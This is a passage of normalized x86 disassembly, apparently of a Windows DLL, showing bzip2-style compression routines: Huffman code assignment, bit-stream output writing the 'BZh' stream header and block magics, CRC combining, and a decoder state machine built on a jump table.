jle r-xdata
inc edx
cmp edx 0x10
jl r-xdata
mov [ eax ] 0x1
xor ecx ecx
cmp edx [ ebp - 0x34 ]
mov [ ebp - 0x24 ] edx
jg r-xdata
mov eax [ ebp - 0x2c ]
movzx eax [ eax + ecx ]
cmp eax [ ebp - 0x34 ]
jle r-xdata
mov dl [ ebp - 0xc ]
mov al [ edi - 0x4652 ]
xor ecx ecx
mov [ ebp - 0x35 ] dl
cmp al dl
je r-xdata
cmp [ edx + edi ] 0x0
je r-xdata
inc ecx
add edi 0x10
cmp ecx 0x10
jl r-xdata
inc [ ebp - 0x20 ]
mov eax [ ebp - 0x20 ]
add [ ebp - 0x2c ] 0x102
cmp eax [ ebp - 0x30 ]
jl r-xdata
xor eax eax
cmp [ ebp - 0x3c ] eax
jle r-xdata
cmp eax edx
jge r-xdata
mov [ ebp - 0x34 ] eax
lea eax [ ebp + ecx - 0x1c ]
mov [ eax ] 0x0
xor edx edx
mov eax [ esi + 0x4c ]
mov [ ebp - 0x34 ] eax
xor edi edi
xor ecx ecx
cmp [ ebp - 0x3c ] ecx
push 0x20
pop edx
mov [ ebp - 0x34 ] ecx
jle r-xdata
add ecx ecx
inc [ ebp - 0x24 ]
mov eax [ ebp - 0x24 ]
cmp eax [ ebp - 0x34 ]
jle r-xdata
mov edx [ ebp - 0x2c ]
movzx edx [ eax + edx ]
cmp edx [ ebp - 0x24 ]
jne r-xdata
inc ecx
cmp ecx [ ebp - 0x3c ]
jl r-xdata
mov edx eax
push 0x1
inc ecx
push ecx
jmp r-xdata
inc eax
cmp eax [ ebp - 0x3c ]
jl r-xdata
mov edx [ ebp - 0x28 ]
add edx eax
add edx [ ebp - 0x2c ]
mov [ esi + edx * 4 ] ecx
inc ecx
cmp [ ebp - 0x34 ] 0x11
jg r-xdata
xor ecx ecx
mov eax esi
cmp [ ebp + edi - 0x1c ] cl
je r-xdata
and [ ebp - 0x24 ] 0x0
lea eax [ esi + 0x58 ]
mov [ ebp - 0x28 ] eax
call sub_1001d389
inc edi
cmp edi 0x10
pop ecx
jl r-xdata
push 0xbbc
jmp r-xdata
cmp edx 0x1
jl r-xdata
inc [ ebp - 0x24 ]
add [ ebp - 0x28 ] 0x10
cmp [ ebp - 0x24 ] 0x10
jl r-xdata
xor edi edi
push 0xbbd
jmp r-xdata
mov eax [ ebp - 0x24 ]
cmp [ ebp + eax - 0x1c ] 0x0
je r-xdata
cmp [ esi + 0x268 ] 0x3
jl r-xdata
push 0x1
inc ecx
push ecx
jmp r-xdata
mov eax [ esi + 0x4c ]
mov ecx [ ebp - 0x30 ]
mov [ ebp - 0x34 ] eax
push 0x3
mov eax esi
call sub_1001d389
mov ecx [ ebp - 0x40 ]
push 0xf
call sub_1001d389
cmp [ ebp - 0x40 ] 0x0
pop ecx
pop ecx
jle r-xdata
mov eax [ esi + 0x4c ]
sub eax [ ebp - 0x34 ]
push eax
push r--data
call sub_100273c7
add eax 0x40
push eax
call sub_1002757c
add esp 0xc
mov eax [ ebp - 0x28 ]
xor ecx ecx
cmp [ edi + eax ] cl
mov eax esi
je r-xdata
call sub_1001d389
inc edi
cmp edi 0x10
pop ecx
jl r-xdata
cmp [ esi + 0x268 ] 0x3
jl r-xdata
mov eax [ ebp - 0x40 ]
lea edi [ esi + 0x4cd2 ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x30 ]
mov eax [ esi + 0x4c ]
mov [ ebp - 0x34 ] eax
test ecx ecx
jle r-xdata
mov eax [ esi + 0x4c ]
sub eax [ ebp - 0x34 ]
push eax
push r--data
call sub_100273c7
add eax 0x40
push eax
call sub_1002757c
add esp 0xc
push 0x1
xor ecx ecx
mov eax esi
call sub_1001d389
inc edi
dec [ ebp - 0xc ]
pop ecx
jne r-xdata
xor ecx ecx
inc ecx
push ecx
mov eax esi
call sub_1001d389
movzx eax [ edi ]
inc [ ebp - 0x28 ]
cmp [ ebp - 0x28 ] eax
pop ecx
jl r-xdata
cmp [ esi + 0x268 ] 0x3
jl r-xdata
lea eax [ esi + 0x9324 ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0xc ] ecx
and [ ebp - 0x28 ] 0x0
cmp [ edi ] 0x0
jbe r-xdata
mov eax [ esi + 0x4c ]
xor ecx ecx
mov [ ebp - 0x34 ] eax
mov eax [ esi + 0x274 ]
cmp eax ecx
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x24 ] ecx
jle r-xdata
mov eax [ esi + 0x4c ]
sub eax [ ebp - 0x34 ]
push eax
push r--data
call sub_100273c7
add eax 0x40
push eax
call sub_1002757c
add esp 0xc
add [ ebp - 0x20 ] 0x102
dec [ ebp - 0xc ]
jne r-xdata
mov eax [ ebp - 0x3c ]
mov edi [ ebp - 0x20 ]
mov [ ebp - 0x28 ] eax
jmp r-xdata
mov eax [ ebp - 0x3c ]
cmp eax [ ebp - 0x40 ]
je r-xdata
lea edx [ ecx + 0x31 ]
cmp edx eax
mov [ ebp - 0xc ] edx
mov [ ebp - 0x2c ] edx
jl r-xdata
mov eax [ ebp - 0x20 ]
movzx ecx [ eax ]
push 0x5
mov eax esi
mov [ ebp - 0x2c ] ecx
call sub_1001d389
cmp [ ebp - 0x3c ] 0x0
pop ecx
jle r-xdata
movzx eax [ edi ]
cmp [ ebp - 0x2c ] eax
jl r-xdata
cmp [ esi + 0x268 ] 0x3
jl r-xdata
push 0xbbf
jmp r-xdata
mov eax [ ebp - 0x3c ]
lea edi [ eax + esi + 0x680 ]
movzx eax [ edi ]
cmp eax [ ebp - 0x30 ]
jge r-xdata
dec eax
mov [ ebp - 0x2c ] eax
push 0x2
pop ecx
push ecx
mov eax esi
call sub_1001d389
inc [ ebp - 0x2c ]
pop ecx
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_100242d7
leave
retn
mov eax [ esi + 0x4c ]
sub eax [ ebp - 0x34 ]
push eax
push r--data
call sub_100273c7
add eax 0x40
push eax
call sub_1002757c
add esp 0xc
push 0xbbe
jmp r-xdata
cmp [ ebp - 0x30 ] 0x6
jne r-xdata
movzx eax [ edi ]
cmp [ ebp - 0x2c ] eax
mov eax esi
jg r-xdata
cmp ecx [ ebp - 0x2c ]
mov [ ebp - 0x24 ] ecx
jg r-xdata
mov eax [ ebp - 0x2c ]
sub eax ecx
inc eax
cmp eax 0x32
jne r-xdata
push 0x2
push 0x3
pop ecx
call sub_1001d389
dec [ ebp - 0x2c ]
pop ecx
push 0x1
xor ecx ecx
call sub_1001d389
inc edi
dec [ ebp - 0x28 ]
pop ecx
jne r-xdata
mov ecx [ ebp - 0x2c ]
mov eax [ esi + 0x274 ]
inc ecx
inc [ ebp - 0x3c ]
cmp ecx eax
mov [ ebp - 0x24 ] ecx
jl r-xdata
movzx eax [ edi ]
mov ecx [ ebp - 0x24 ]
movzx ecx [ ebx + ecx * 2 ]
lea edx [ eax + 0x26 ]
add eax 0x92
imul edx edx 0x102
imul eax eax 0x102
add eax esi
movzx eax [ eax + ecx ]
add edx ecx
mov ecx [ esi + edx * 4 ]
push eax
mov eax esi
call sub_1001d389
inc [ ebp - 0x24 ]
mov eax [ ebp - 0x24 ]
cmp eax [ ebp - 0x2c ]
pop ecx
jle r-xdata
movzx eax [ edi ]
mov ecx [ ebp - 0x24 ]
movzx ecx [ ebx + ecx * 2 ]
lea edi [ eax + 0x92 ]
add eax 0x26
imul edi edi 0x102
imul eax eax 0x408
add edi esi
movzx edx [ edi + ecx ]
add eax esi
mov ecx [ eax + ecx * 4 ]
mov [ ebp - 0x20 ] eax
push edx
mov eax esi
call sub_1001d389
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x2 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001d389
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x4 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001d389
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x6 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001d389
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x8 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001d389
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0xa ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001d389
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0xc ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001d389
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0xe ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001d389
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x10 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001d389
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x12 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001d389
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x14 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001d389
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x16 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001d389
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x18 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001d389
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x1a ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001d389
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x1c ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001d389
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x1e ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001d389
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x20 ]
movzx ecx [ edi + eax ]
add esp 0x40
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001d389
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x22 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001d389
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x24 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001d389
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x26 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001d389
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x28 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001d389
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x2a ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001d389
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x2c ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001d389
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x2e ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001d389
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x30 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001d389
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x32 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001d389
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x34 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001d389
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x36 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001d389
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x38 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001d389
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x3a ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001d389
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x3c ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001d389
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x3e ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001d389
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x40 ]
movzx ecx [ edi + eax ]
add esp 0x40
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001d389
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x42 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001d389
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x44 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001d389
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x46 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001d389
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x48 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001d389
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x4a ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001d389
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x4c ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001d389
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x4e ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001d389
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x50 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001d389
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x52 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001d389
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x54 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001d389
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x56 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001d389
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x58 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001d389
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x5a ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001d389
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x5c ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001d389
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x5e ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001d389
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x60 ]
movzx ecx [ edi + eax ]
add esp 0x40
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001d389
mov eax [ ebp - 0xc ]
movzx eax [ ebx + eax * 2 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001d389
pop ecx
pop ecx
jmp r-xdata
sub_1001ee9c
push ecx
push ebx
push esi
mov esi eax
push edi
mov edi [ esi + 0x44 ]
xor ebx ebx
cmp edi ebx
jle r-xdata
mov eax [ esi + 0x14 ]
add eax [ esi + 0x44 ]
cmp [ esi + 0x26c ] 0x1
push 0x8
mov [ esi + 0x2c ] eax
pop edi
jne r-xdata
lea eax [ esi + 0x260 ]
mov edx [ eax ]
not edx
lea ecx [ esi + 0x264 ]
mov [ eax ] edx
mov eax [ ecx ]
rol eax 0x1
xor eax edx
mov [ ecx ] eax
mov ecx [ esi + 0x26c ]
cmp ecx 0x1
jle r-xdata
cmp [ esi + 0x44 ] ebx
jle r-xdata
push edi
push 0x42
pop ecx
mov eax esi
mov [ esi + 0x25c ] ebx
mov [ esi + 0x258 ] ebx
call sub_1001d389
pop ecx
push edi
push 0x5a
pop ecx
call sub_1001d389
pop ecx
push edi
push 0x68
pop ecx
call sub_1001d389
mov al [ esi + 0x270 ]
add al 0x30
pop ecx
movzx ecx al
push edi
mov eax esi
call sub_1001d389
pop ecx
cmp [ esi + 0x268 ] 0x2
jl r-xdata
mov [ esi + 0x4c ] ebx
cmp [ esp + 0x14 ] bl
je r-xdata
push edi
push 0x31
pop ecx
mov eax esi
call sub_1001d389
pop ecx
push edi
push 0x41
pop ecx
call sub_1001d389
pop ecx
push edi
push 0x59
pop ecx
call sub_1001d389
pop ecx
push edi
push 0x26
pop ecx
call sub_1001d389
pop ecx
push edi
push 0x53
pop ecx
call sub_1001d389
pop ecx
push edi
push 0x59
pop ecx
call sub_1001d389
mov ebx [ esi + 0x260 ]
pop ecx
call sub_1001d3e4
push 0x1
xor ecx ecx
call sub_1001d389
pop ecx
mov ecx [ esi + 0x1c ]
push 0x18
call sub_1001d389
pop ecx
call sub_1001d421
call sub_1001d5b7
xor ebx ebx
mov edi esi
call sub_10022388
push edi
push eax
push edx
push ecx
push r--data
call sub_100273c7
add eax 0x40
push eax
call sub_1002757c
add esp 0x18
pop edi
pop esi
pop ebx
pop ecx
retn
push edi
push 0x17
pop ecx
mov eax esi
call sub_1001d389
pop ecx
push edi
push 0x72
pop ecx
call sub_1001d389
pop ecx
push edi
push 0x45
pop ecx
call sub_1001d389
pop ecx
push edi
push 0x38
pop ecx
call sub_1001d389
pop ecx
push edi
push 0x50
pop ecx
call sub_1001d389
pop ecx
push edi
mov ecx 0x90
call sub_1001d389
lea edi [ esi + 0x264 ]
mov ebx [ edi ]
pop ecx
call sub_1001d3e4
cmp [ esi + 0x268 ] 0x2
jl r-xdata
cmp [ esi + 0x25c ] 0x0
jle r-xdata
push [ edi ]
push r--data
call sub_100273c7
add eax 0x40
push eax
call sub_1002757c
add esp 0xc
lea eax [ esi + 0x258 ]
mov ecx [ esi + 0x4c ]
mov bl [ eax + 0x3 ]
mov edx [ esi + 0x2c ]
mov [ ecx + edx ] bl
inc [ esi + 0x4c ]
shl [ eax ] 0x8
add [ esi + 0x25c ] 0xfffffff8
cmp [ esi + 0x25c ] 0x0
jg r-xdata
sub_1001f06f
push ebp
mov ebp esp
sub esp 0x80
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x4 ]
push esi
mov esi [ ebx ]
xor ecx ecx
push edi
cmp eax 0xa
jne r-xdata
mov ecx [ ebx + 0xfa14 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ ebx + 0xfa18 ]
mov [ ebp - 0x1c ] ecx
mov ecx [ ebx + 0xfa1c ]
mov [ ebp - 0x3c ] ecx
mov ecx [ ebx + 0xfa20 ]
mov [ ebp - 0x60 ] ecx
mov ecx [ ebx + 0xfa24 ]
mov [ ebp - 0x44 ] ecx
mov ecx [ ebx + 0xfa28 ]
mov [ ebp - 0x50 ] ecx
mov ecx [ ebx + 0xfa2c ]
mov [ ebp - 0x64 ] ecx
mov ecx [ ebx + 0xfa30 ]
mov [ ebp - 0x24 ] ecx
mov ecx [ ebx + 0xfa34 ]
mov [ ebp - 0x28 ] ecx
mov ecx [ ebx + 0xfa38 ]
mov [ ebp - 0x54 ] ecx
mov ecx [ ebx + 0xfa3c ]
mov [ ebp - 0x30 ] ecx
mov ecx [ ebx + 0xfa40 ]
mov [ ebp - 0x18 ] ecx
mov ecx [ ebx + 0xfa44 ]
mov [ ebp - 0x20 ] ecx
mov ecx [ ebx + 0xfa48 ]
mov [ ebp - 0x74 ] ecx
mov ecx [ ebx + 0xfa4c ]
mov [ ebp - 0x34 ] ecx
mov ecx [ ebx + 0xfa50 ]
mov [ ebp - 0x80 ] ecx
mov ecx [ ebx + 0xfa54 ]
mov [ ebp - 0x14 ] ecx
mov ecx [ ebx + 0xfa58 ]
mov [ ebp - 0x2c ] ecx
mov ecx [ ebx + 0xfa5c ]
mov [ ebp - 0x6c ] ecx
mov ecx [ ebx + 0xfa60 ]
mov [ ebp - 0x70 ] ecx
mov ecx [ ebx + 0xfa64 ]
mov [ ebp - 0x5c ] ecx
mov ecx [ ebx + 0xfa68 ]
mov [ ebp - 0x48 ] ecx
mov ecx [ ebx + 0xfa6c ]
mov [ ebp - 0x40 ] ecx
mov ecx [ ebx + 0xfa70 ]
add eax 0xfffffff6
mov [ ebp - 0x4c ] ecx
cmp eax 0x28
ja r-xdata
mov [ ebx + 0xfa14 ] ecx
mov [ ebx + 0xfa18 ] ecx
mov [ ebx + 0xfa1c ] ecx
mov [ ebx + 0xfa20 ] ecx
mov [ ebx + 0xfa24 ] ecx
mov [ ebx + 0xfa28 ] ecx
mov [ ebx + 0xfa2c ] ecx
mov [ ebx + 0xfa30 ] ecx
mov [ ebx + 0xfa34 ] ecx
mov [ ebx + 0xfa38 ] ecx
mov [ ebx + 0xfa3c ] ecx
mov [ ebx + 0xfa40 ] ecx
mov [ ebx + 0xfa44 ] ecx
mov [ ebx + 0xfa48 ] ecx
mov [ ebx + 0xfa4c ] ecx
mov [ ebx + 0xfa50 ] ecx
mov [ ebx + 0xfa54 ] ecx
mov [ ebx + 0xfa58 ] ecx
mov [ ebx + 0xfa5c ] ecx
mov [ ebx + 0xfa60 ] ecx
mov [ ebx + 0xfa64 ] ecx
mov [ ebx + 0xfa68 ] ecx
mov [ ebx + 0xfa6c ] ecx
mov [ ebx + 0xfa70 ] ecx
push 0xfa1
call sub_1001bf0e
mov edi 0xff
jmp [ eax * 4 + jump_table_10020e97 ]
mov [ ebx + 0x4 ] 0xa
jmp r-xdata
mov [ ebx + 0x4 ] 0xb
jmp r-xdata
mov [ ebx + 0x4 ] 0xc
jmp r-xdata
mov [ ebx + 0x4 ] 0xd
jmp r-xdata
mov [ ebx + 0x4 ] 0xe
jmp r-xdata
mov [ ebx + 0x4 ] 0xf
jmp r-xdata
mov [ ebx + 0x4 ] 0x10
jmp r-xdata
mov [ ebx + 0x4 ] 0x11
jmp r-xdata
mov [ ebx + 0x4 ] 0x12
jmp r-xdata
mov [ ebx + 0x4 ] 0x13
jmp r-xdata
mov [ ebx + 0x4 ] 0x14
jmp r-xdata
mov [ ebx + 0x4 ] 0x15
jmp r-xdata
mov [ ebx + 0x4 ] 0x16
jmp r-xdata
mov [ ebx + 0x4 ] 0x17
jmp r-xdata
mov [ ebx + 0x4 ] 0x18
jmp r-xdata
mov [ ebx + 0x4 ] 0x19
jmp r-xdata
mov [ ebx + 0x4 ] 0x1a
jmp r-xdata
mov [ ebx + 0x4 ] 0x1b
jmp r-xdata
mov [ ebx + 0x4 ] 0x1c
jmp r-xdata
mov [ ebx + 0x4 ] 0x1d
jmp r-xdata
mov [ ebx + 0x4 ] 0x1e
jmp r-xdata
mov [ ebx + 0x4 ] 0x1f
jmp r-xdata
mov [ ebx + 0x4 ] 0x20
jmp r-xdata
mov [ ebx + 0x4 ] 0x23
jmp r-xdata
mov [ ebx + 0x4 ] 0x22
jmp r-xdata
mov [ ebx + 0x4 ] 0x21
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov [ ebx + 0x4 ] 0x24
jmp r-xdata
mov [ ebx + 0x4 ] 0x25
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov [ ebx + 0x4 ] 0x26
jmp r-xdata
mov [ ebx + 0x4 ] 0x27
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov [ ebx + 0x4 ] 0x28
jmp r-xdata
mov [ ebx + 0x4 ] 0x29
jmp r-xdata
mov [ ebx + 0x4 ] 0x2a
jmp r-xdata
mov [ ebx + 0x4 ] 0x2b
jmp r-xdata
mov [ ebx + 0x4 ] 0x2c
jmp r-xdata
mov [ ebx + 0x4 ] 0x2d
jmp r-xdata
mov [ ebx + 0x4 ] 0x2e
jmp r-xdata
mov [ ebx + 0x4 ] 0x2f
jmp r-xdata
mov [ ebx + 0x4 ] 0x30
jmp r-xdata
mov [ ebx + 0x4 ] 0x31
jmp r-xdata
mov [ ebx + 0x4 ] 0x32
jmp r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x1
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x1
jl r-xdata
cmp [ ebx + 0x20 ] 0x1
jl r-xdata
cmp [ ebx + 0x20 ] 0x3
jl r-xdata
cmp [ ebx + 0x20 ] 0xf
jl r-xdata
cmp [ ebx + 0x20 ] 0x1
jl r-xdata
cmp [ ebx + 0x20 ] 0x1
jl r-xdata
cmp [ ebx + 0x20 ] 0x1
jl r-xdata
cmp [ ebx + 0x20 ] 0x5
jl r-xdata
cmp [ ebx + 0x20 ] ecx
jl r-xdata
